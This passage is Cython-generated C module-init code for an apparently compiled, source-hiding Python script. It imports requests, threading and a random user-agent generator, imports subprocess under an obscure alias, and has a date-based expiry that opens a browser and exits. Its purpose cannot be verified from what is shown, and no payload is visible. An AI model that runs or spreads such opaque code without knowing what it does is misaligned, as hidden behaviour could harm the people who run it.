  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_get);
  __Pyx_GIVEREF(__pyx_n_s_get);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_get);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get, __pyx_t_1) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_uuid, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_2) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_hashlib, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hashlib, __pyx_t_2) < 0) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_re, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_re, __pyx_t_2) < 0) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_randrange);
  __Pyx_GIVEREF(__pyx_n_s_randrange);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_randrange);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_randrange); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_rr, __pyx_t_2) < 0) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_choice);
  __Pyx_GIVEREF(__pyx_n_s_choice);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_choice);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_random, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cc, __pyx_t_1) < 0) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_generate_user_agent);
  __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_generate_user_agent);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ggb, __pyx_t_2) < 0) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_post);
  __Pyx_GIVEREF(__pyx_n_s_post);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_post);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_post); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pp, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s__64);
  __Pyx_GIVEREF(__pyx_n_s__64);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s__64);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (__pyx_import_star(__pyx_t_1) < 0) __PYX_ERR(0, 20, __pyx_L1_error);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_Thread);
  __Pyx_GIVEREF(__pyx_n_s_Thread);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Thread);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_threading, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Thread); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Thread, __pyx_t_1) < 0) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_2) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_2) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_webbrowser, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_webbrowser, __pyx_t_2) < 0) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_subprocess, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sn73, __pyx_t_2) < 0) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_importlib, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_importlib, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_2) < 0) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_webbrowser, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_webbrowser, __pyx_t_2) < 0) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_2) < 0) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_2) < 0) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_2) < 0) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_2) < 0) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_datetime, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_2) < 0) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_today); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_now, __pyx_t_1) < 0) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_now); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_an, __pyx_t_2) < 0) __PYX_ERR(0, 35, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__65, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_an2, __pyx_t_2) < 0) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_now); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_hour); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hours, __pyx_t_1) < 0) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_an); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_an2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = PyObject_RichCompare(__pyx_t_1, __pyx_t_2, Py_GT); __Pyx_XGOTREF(__pyx_t_4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (!__pyx_t_5) {
  } else {
    __pyx_t_3 = __pyx_t_5;
    goto __pyx_L3_bool_binop_done;
  }
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_an); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_an2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = PyObject_RichCompare(__pyx_t_4, __pyx_t_2, Py_EQ); __Pyx_XGOTREF(__pyx_t_1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_3 = __pyx_t_5;
  __pyx_L3_bool_binop_done:;
  if (__pyx_t_3) {

    
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__66, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 39, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_time); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 41, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_sleep); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__67, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 41, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_webbrowser); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_open); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__68, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __pyx_t_1 = PyList_New(12); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 44, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_INCREF(__pyx_kp_u__69);
    __Pyx_GIVEREF(__pyx_kp_u__69);
    PyList_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__69);
    __Pyx_INCREF(__pyx_kp_u__70);
    __Pyx_GIVEREF(__pyx_kp_u__70);
    PyList_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u__70);
    __Pyx_INCREF(__pyx_kp_u__71);
    __Pyx_GIVEREF(__pyx_kp_u__71);
    PyList_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__71);
    __Pyx_INCREF(__pyx_kp_u__72);
    __Pyx_GIVEREF(__pyx_kp_u__72);
    PyList_SET_ITEM(__pyx_t_1, 3, __pyx_kp_u__72);
    __Pyx_INCREF(__pyx_kp_u__73);
    __Pyx_GIVEREF(__pyx_kp_u__73);
    PyList_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u__73);
    __Pyx_INCREF(__pyx_kp_u__74);
    __Pyx_GIVEREF(__pyx_kp_u__74);
    PyList_SET_ITEM(__pyx_t_1, 5, __pyx_kp_u__74);
    __Pyx_INCREF(__pyx_kp_u__75);
    __Pyx_GIVEREF(__pyx_kp_u__75);
    PyList_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u__75);
    __Pyx_INCREF(__pyx_kp_u__76);
    __Pyx_GIVEREF(__pyx_kp_u__76);
    PyList_SET_ITEM(__pyx_t_1, 7, __pyx_kp_u__76);
    __Pyx_INCREF(__pyx_kp_u__77);
    __Pyx_GIVEREF(__pyx_kp_u__77);
    PyList_SET_ITEM(__pyx_t_1, 8, __pyx_kp_u__77);
    __Pyx_INCREF(__pyx_kp_u__78);
    __Pyx_GIVEREF(__pyx_kp_u__78);
    PyList_SET_ITEM(__pyx_t_1, 9, __pyx_kp_u__78);
    __Pyx_INCREF(__pyx_kp_u__79);
    __Pyx_GIVEREF(__pyx_kp_u__79);
    PyList_SET_ITEM(__pyx_t_1, 10, __pyx_kp_u__79);
    __Pyx_INCREF(__pyx_kp_u__80);
    __Pyx_GIVEREF(__pyx_kp_u__80);
    PyList_SET_ITEM(__pyx_t_1, 11, __pyx_kp_u__80);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_clock_emoji, __pyx_t_1) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
  }

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B6, __pyx_kp_u_1_96m) < 0) __PYX_ERR(0, 47, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_30m) < 0) __PYX_ERR(0, 48, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G6, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 49, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_red6, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 50, __pyx_L1_error)

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_B6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_kp_u_Ps_W_W_C_Y_PP); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 54, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_u_requests);
  __Pyx_GIVEREF(__pyx_n_u_requests);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_u_requests);
  __Pyx_INCREF(__pyx_n_u_random);
  __Pyx_GIVEREF(__pyx_n_u_random);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_u_random);
  __Pyx_INCREF(__pyx_n_u_uuid);
  __Pyx_GIVEREF(__pyx_n_u_uuid);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_u_uuid);
  __Pyx_INCREF(__pyx_n_u_user_agent_2);
  __Pyx_GIVEREF(__pyx_n_u_user_agent_2);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_n_u_user_agent_2);
  __Pyx_INCREF(__pyx_n_u_hashlib);
  __Pyx_GIVEREF(__pyx_n_u_hashlib);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_n_u_hashlib);
  __Pyx_INCREF(__pyx_n_u_webbrowser);
  __Pyx_GIVEREF(__pyx_n_u_webbrowser);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_n_u_webbrowser);
  __Pyx_INCREF(__pyx_n_u_threading);
  __Pyx_GIVEREF(__pyx_n_u_threading);
  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_n_u_threading);
  __Pyx_INCREF(__pyx_n_u_cfonts);
  __Pyx_GIVEREF(__pyx_n_u_cfonts);
  PyList_SET_ITEM(__pyx_t_1, 7, __pyx_n_u_cfonts);
  __Pyx_INCREF(__pyx_n_u_rich);
  __Pyx_GIVEREF(__pyx_n_u_rich);
  PyList_SET_ITEM(__pyx_t_1, 8, __pyx_n_u_rich);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ss66, __pyx_t_1) < 0) __PYX_ERR(0, 54, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
